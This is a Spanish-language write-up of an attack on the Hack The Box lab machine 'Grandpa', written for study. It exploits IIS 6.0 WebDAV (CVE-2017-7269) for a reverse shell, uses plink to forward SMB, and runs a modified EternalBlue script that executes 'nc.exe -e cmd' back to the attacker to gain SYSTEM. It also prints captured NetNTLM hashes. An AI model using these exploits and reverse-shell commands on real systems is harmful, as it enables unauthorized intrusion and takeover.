---
title: Hack The Box Grandpa
author: k4miyo
date: 2021-09-20
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Patch Management]
ping: true
---

## Grandpa
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.14.

```bash
❯ ping -c 1 10.10.10.14
PING 10.10.10.14 (10.10.10.14) 56(84) bytes of data.
64 bytes from 10.10.10.14: icmp_seq=1 ttl=127 time=140 ms

--- 10.10.10.14 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 139.697/139.697/139.697/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.14 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-08 11:46 CDT
Initiating SYN Stealth Scan at 11:46
Scanning 10.10.10.14 [65535 ports]
Discovered open port 80/tcp on 10.10.10.14
Completed SYN Stealth Scan at 11:47, 26.60s elapsed (65535 total ports)
Nmap scan report for 10.10.10.14
Host is up, received user-set (0.15s latency).
Scanned at 2021-09-08 11:46:35 CDT for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.93 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 19 (836B)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh`, se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.14
   5   │     [*] Open ports: 80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p80 10.10.10.14 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-08 11:49 CDT
Nmap scan report for 10.10.10.14
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Date: Wed, 08 Sep 2021 16:53:58 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.54 seconds
```

Obsevamos el puerto 80/TCP abierto y se encuentra corriendo la tecnología *Microsoft IIS httpd 6.0* la cual es vulnerable a buffer overflow en la función *ScStoragePathFromUrl* en el servicio *WebDAV* asociado al CVE CVE-2017-7269. Ahora procedemos a descargar el [exploit](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell).

```bash
❯ wget https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
hell - Parrot Terminal--2021-09-10 01:15:57--  https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 12313 (12K) [text/plain]
Grabando a: «iis6 reverse shell»

iis6 reverse shell               100%[=========================================================>]  12.02K  --.-KB/s    en 0.003s  

2021-09-10 01:15:57 (4.45 MB/s) - «iis6 reverse shell» guardado [12313/12313]

❯ mv iis6\ reverse\ shell exploit_iis6.py
```

Lo ejecutamos y observamos que necesitamos introducir parámetros, por lo que nos ponemos en escucha a través del puerto 443 y procedemos a ejecutar el exploit (se le cambio el nombre a *exploit_iis6.py*):

```bash
❯ python2 exploit_iis6.py 10.10.10.14 80 10.10.14.13 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\network service

c:\windows\system32\inetsrv>
```

Nos encontramos en la máquina víctima como el usuario *network service*, ahora procedemos a enumerar un poco el sistema para determinar una forma de escalar privilegios.

```bash
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

c:\windows\system32\inetsrv>
```

Observamos que tenemos el privilegio *SeImpersonatePrivilege*, por lo que ya debemos estar pensando en **Juicy Potato**. Checamos la arquitectura de la máquina:

```bash
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 3 Minutes, 14 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~1999 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 794 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,330 MB
Page File: In Use:         140 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

c:\windows\system32\inetsrv>
```

Aqui observamos otra manera potencial de escalar privilegios debido a la versión del sistema operativo que está corriendo la máquina; sin embargo, vamos a hacerlo de otra forma. Listamos los puertos que se encuentran abiertos en la máquina:

```bash
netstat -nat
netstat -nat

Active Connections

  Proto  Local Address          Foreign Address        State           Offload State

  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:1027           0.0.0.0:0              LISTENING       InHost      
  TCP    0.0.0.0:5859           0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.14:80         10.10.14.16:51528      CLOSE_WAIT      InHost      
  TCP    10.10.10.14:80         10.10.14.16:51586      ESTABLISHED     InHost      
  TCP    10.10.10.14:139        0.0.0.0:0              LISTENING       InHost      
  TCP    10.10.10.14:1030       10.10.14.16:443        CLOSE_WAIT      InHost      
  TCP    10.10.10.14:1033       10.10.14.16:443        ESTABLISHED     InHost      
  TCP    10.10.10.14:1037       10.10.14.16:445        SYN_SENT        InHost      
  TCP    10.10.10.14:1038       10.10.14.16:139        SYN_SENT        InHost      
  TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING       InHost      
  UDP    0.0.0.0:445            *:*                    
  UDP    0.0.0.0:500            *:*                    
  UDP    0.0.0.0:1026           *:*                    
  UDP    0.0.0.0:4500           *:*                    
  UDP    10.10.10.14:123        *:*                    
  UDP    10.10.10.14:137        *:*                    
  UDP    10.10.10.14:138        *:*                    
  UDP    127.0.0.1:123          *:*                    
  UDP    127.0.0.1:1029         *:*                    

C:\WINDOWS\Temp\Privesc>
```

Vemos que tiene el puerto 445 abierto de manera interna, así que vamos a aplicar un *Remote Port Forwarding* con la herramienta [plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) descargando para la arquitectura x86. Nos compartimos un servidor SMB y transferimos el archivo:

```bash
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.14,1041)
[*] AUTHENTICATE_MESSAGE (HTB\GRANPA$,GRANPA)
[*] User GRANPA\GRANPA$ authenticated successfully
[*] GRANPA$::HTB:9b79014814b02ec500000000000000000000000000000000:fb3cb214046af8b85e0b4e269e6cf87ff6bbe6dd226641f0:aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
```

```bash
copy \\10.10.14.16\smbFolder\plink.exe plink.exe
copy \\10.10.14.16\smbFolder\plink.exe plink.exe
        1 file(s) copied.

C:\WINDOWS\Temp\Privesc>
dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\WINDOWS\Temp\Privesc

09/21/2021  05:13 AM    <DIR>          .
09/21/2021  05:13 AM    <DIR>          ..
09/21/2021  05:07 AM           646,384 plink.exe
               1 File(s)        646,384 bytes
               2 Dir(s)   1,317,171,200 bytes free

C:\WINDOWS\Temp\Privesc>
```

Antes de ejecutar el programa, vamos a transferir el archivo `nc.exe` a la máquina víctima:

```bash
❯ impacket-smbserver smbFolder $(pwd)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.14,1041)
[*] AUTHENTICATE_MESSAGE (HTB\GRANPA$,GRANPA)
[*] User GRANPA\GRANPA$ authenticated successfully
[*] GRANPA$::HTB:9b79014814b02ec500000000000000000000000000000000:fb3cb214046af8b85e0b4e269e6cf87ff6bbe6dd226641f0:aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
[*] Closing down connection (10.10.10.14,1041)
[*] Remaining connections []
[*] Incoming connection (10.10.10.14,1043)
[*] AUTHENTICATE_MESSAGE (HTB\GRANPA$,GRANPA)
[*] User GRANPA\GRANPA$ authenticated successfully
[*] GRANPA$::HTB:76388b43cfb1010a00000000000000000000000000000000:547480074db8df31be922058c85eadcca897e7868d103ba7:aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
[*] Closing down connection (10.10.10.14,1043)
[*] Remaining connections []
```

```bash
copy \\10.10.14.16\smbFolder\nc.exe nc.exe
copy \\10.10.14.16\smbFolder\nc.exe nc.exe
        1 file(s) copied.

dir
dir
 Volume in drive C has no label.
 Volume Serial Number is FDCB-B9EF

 Directory of C:\WINDOWS\Temp\Privesc

09/21/2021  05:14 AM    <DIR>          .
09/21/2021  05:14 AM    <DIR>          ..
09/21/2021  04:59 AM            28,160 nc.exe
09/21/2021  05:07 AM           646,384 plink.exe
               2 File(s)        674,544 bytes
               2 Dir(s)   1,317,138,432 bytes free

C:\WINDOWS\Temp\Privesc>
```

Debemos tener en cuenta que necesitamos hacer algunos cambios en nuetra máquina de atacante; primero editamos el archivo `/etc/ssh/sshd_config` modificando los sigueintes parámetros:

- Port 2222
- PermitRootLogin yes

Cambiamos el puerto default del servicio SSH debido a que la plataforma de HackTheBox tiene unas reglas que no permite el puerto 22 para hacer *Remote Port Forwarding* y permitimos el login del usuario **root**.

Una vez hecho esto, levantamos y reiniciamos el servicio SSH; así como también validamos que no tenemos el puerto 445 listado en `netastat`:

```bash
❯ service ssh start
❯ service ssh restart
❯ netstat -nat | grep "445"
```

Por útlimo, cambiamos la contraseña del usuario **root** por una más fácil (para este caso será *hola*). Ahora si, ejecutamos el programa en la máquina víctima:

```bash
❯ passwd
Nueva contraseña: 
Vuelva a escribir la nueva contraseña: 
passwd: contraseña actualizada correctamente
```

```bash
plink.exe -l root -pw hola -R 445:127.0.0.1:445 -P 2222 10.10.14.16
plink.exe -l root -pw hola -R 445:127.0.0.1:445 -P 2222 10.10.14.16
The server's host key is not cached. You have no guarantee
that the server is the computer you think it is.
The server's ssh-ed25519 key fingerprint is:
ssh-ed25519 255 SHA256:NCwkGzWJ47qJZj30RdSxdkzOTenMrn4+fRsdijaL5GQ
If you trust this host, enter "y" to add the key to
PuTTY's cache and carry on connecting.
If you want to carry on connecting just once, without
adding the key to the cache, enter "n".
If you do not trust this host, press Return to abandon the
connection.
y
Using username "root".
```

Ahora validamos que tenemos el puerto 445 en escucha en nuestra máquina:

```bash
❯ netstat -nat | grep "445"
tcp        0      0 127.0.0.1:445           0.0.0.0:*               LISTEN     
tcp6       0      0 ::1:445                 :::*                    LISTEN
```

También podríamos validar con `crackmapexec` recordando que debemos apuntar a nuestra loopback:

```bash
❯ crackmapexec smb 127.0.0.1
SMB         127.0.0.1       445    GRANPA           [*] Windows Server 2003 R2 3790 Service Pack 2 (name:GRANPA) (domain:granpa) (signing:False) (SMBv1:True)
```

Debido a la versión de sistema operativo y versión de la aplicación SMB, debemos estar pensando en el **Eternal Blue**; así que nos descargamos el exploit:

```bash
❯ git clone https://github.com/worawit/MS17-010
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 765.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
```

Nos metemos en la carpeta y corremos el archivo `checker.py` para validar si la máquina es vulnerable:

```bash
❯ python checker.py 127.0.0.1
Target OS: Windows Server 2003 R2 3790 Service Pack 2
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (32 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (32 bit)
browser: STATUS_OBJECT_NAME_NOT_FOUND
```

Vemos que tiene la leyenda ***OK (32 bit)*** para los *named pipes* **samr** y **lsarpc**; es decir, podemos ejecutar el exploit en la máquina, que para este caso, ocuparemos el `zzz_exploit.py` modificandolo un poco. Las modificaciones que haremos serán las siguientes:

- En la función `def smb_pwn(conn, arch):` comentaremos las siguientes lineas:
  - \#print('creating file c:\\pwned.txt on the target')
  - \#tid2 = smbConn.connectTree('C$') 
  - \#fid2 = smbConn.createFile(tid2, '/pwned.txt')
  - \#smbConn.closeFile(tid2, fid2)
  - \#smbConn.disconnectTree(tid2)
 - Descomentamos la siguiente linea:
   - service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
 - Y la cambiamos a entablarnos una reverse shell con `nc.exe`:
   - service_exec(conn, r'cmd /c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.16 443')
 
Con esto**, lo único que nos falta es ponernos en escucha por e**l puerto 443 y ejectuar el exploit:

```bash
❯ python zzz_exploit.py 127.0.0.1 samr
Target OS: Windows Server 2003 R2 3790 Service Pack 2
Groom packets
attempt controlling next transaction on x64
attempt controlling next transaction on x86
success controlling one transaction
Target is x86
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x85119d48
SESSION: 0xe1278088
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe3054030
userAndGroupCount: 0x5
userAndGroupsAddr: 0xe30540d0
overwriting token UserAndGroups
Opening SVCManager on 127.0.0.1.....
Creating service qgfA.....
Starting service qgfA.....
The NETBIOS connection with the remote host timed out.
Removing service qgfA.....
ServiceExec Error on: 127.0.0.1
nca_s_proto_error
Done
```

```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.14] 1050
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

whoami
whoami
nt authority\system

C:\WINDOWS\system32>
```

Ya con esto nos encontramos dentro de la máquina como el usuario `nt authority\system` y podemos visualizar las flags (user.txt y root.txt).
